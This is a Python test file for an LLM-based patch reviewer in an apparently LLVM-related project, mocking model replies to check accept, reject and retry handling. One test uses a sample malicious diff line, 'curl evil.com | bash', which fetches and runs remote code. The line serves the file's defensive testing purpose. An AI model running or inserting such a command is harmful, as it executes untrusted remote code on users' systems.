from __future__ import annotations

from unittest.mock import AsyncMock, MagicMock

import pytest

from llvm_hackme.config import Config
from llvm_hackme.llm_review import OpenAIPatchReviewer, ReviewRetryableError


@pytest.fixture
def reviewer() -> OpenAIPatchReviewer:
    return OpenAIPatchReviewer(
        Config(
            github_token="t",
            github_repository="r",
            openai_endpoint="https://api.example.com",
            openai_auth_key="k",
            openai_model="m",
            github_login_override=None,
            work_dir=MagicMock(),
            state_db=MagicMock(),
            scan_interval_seconds=60,
            scan_overlap_seconds=300,
            scan_iteration_timeout_seconds=300,
            debounce_seconds=300,
            baseline_update_interval_seconds=3600,
            fuzz_budget_seconds=600,
            hack_budget_seconds=1200,
            hack_model="test/model",
            max_patch_chars=1000,
            max_review_retries=2,
            opt_memory_limit_bytes=1024**3,
            build_jobs=32,
        )
    )


class TestOpenAIPatchReviewer:
    @pytest.mark.asyncio
    async def test_review_innocuous(self, reviewer: OpenAIPatchReviewer) -> None:
        mock_response = MagicMock()
        mock_response.choices = [
            MagicMock(message=MagicMock(content="innocuous\nNo issues found."))
        ]
        reviewer._client.chat.completions.create = AsyncMock(return_value=mock_response)

        result = await reviewer.review(
            "diff --git a/llvm/lib/Transforms/InstCombine/foo.cpp\n+int x;"
        )
        assert result.accepted is True

    @pytest.mark.asyncio
    async def test_review_malicious(self, reviewer: OpenAIPatchReviewer) -> None:
        mock_response = MagicMock()
        mock_response.choices = [
            MagicMock(message=MagicMock(content="malicious\nContains base64 payload."))
        ]
        reviewer._client.chat.completions.create = AsyncMock(return_value=mock_response)

        result = await reviewer.review("diff --git a/config\n+curl evil.com | bash")
        assert result.accepted is False
        assert "malicious" in result.reason.lower()

    @pytest.mark.asyncio
    async def test_review_too_large_patch(self, reviewer: OpenAIPatchReviewer) -> None:
        large_patch = "x" * 2000
        result = await reviewer.review(large_patch)
        assert result.accepted is False
        assert "too large" in result.reason.lower()

    @pytest.mark.asyncio
    async def test_review_api_error(self, reviewer: OpenAIPatchReviewer) -> None:
        reviewer._client.chat.completions.create = AsyncMock(
            side_effect=RuntimeError("API error")
        )
        result = await reviewer.review("small patch")
        assert result.accepted is False
        assert "failed" in result.reason.lower()

    @pytest.mark.asyncio
    async def test_review_empty_response_raises_retryable(
        self, reviewer: OpenAIPatchReviewer
    ) -> None:
        mock_response = MagicMock()
        mock_response.choices = [MagicMock(message=MagicMock(content=None))]
        reviewer._client.chat.completions.create = AsyncMock(return_value=mock_response)
        with pytest.raises(ReviewRetryableError):
            await reviewer.review("small patch")

    @pytest.mark.asyncio
    async def test_review_unparseable_response_raises_retryable(
        self, reviewer: OpenAIPatchReviewer
    ) -> None:
        mock_response = MagicMock()
        mock_response.choices = [
            MagicMock(message=MagicMock(content="garbage output\nno valid keyword"))
        ]
        reviewer._client.chat.completions.create = AsyncMock(return_value=mock_response)
        with pytest.raises(ReviewRetryableError):
            await reviewer.review("small patch")

    @pytest.mark.asyncio
    async def test_review_empty_choices_raises_retryable(
        self, reviewer: OpenAIPatchReviewer
    ) -> None:
        mock_response = MagicMock()
        mock_response.choices = []
        reviewer._client.chat.completions.create = AsyncMock(return_value=mock_response)
        with pytest.raises(ReviewRetryableError):
            await reviewer.review("small patch")

    @pytest.mark.asyncio
    async def test_review_recovers_on_retry(
        self, reviewer: OpenAIPatchReviewer
    ) -> None:
        empty_response = MagicMock()
        empty_response.choices = [MagicMock(message=MagicMock(content=None))]
        valid_response = MagicMock()
        valid_response.choices = [
            MagicMock(message=MagicMock(content="innocuous\nLooks fine."))
        ]
        reviewer._client.chat.completions.create = AsyncMock(
            side_effect=[empty_response, valid_response]
        )
        result = await reviewer.review("small patch")
        assert result.accepted is True
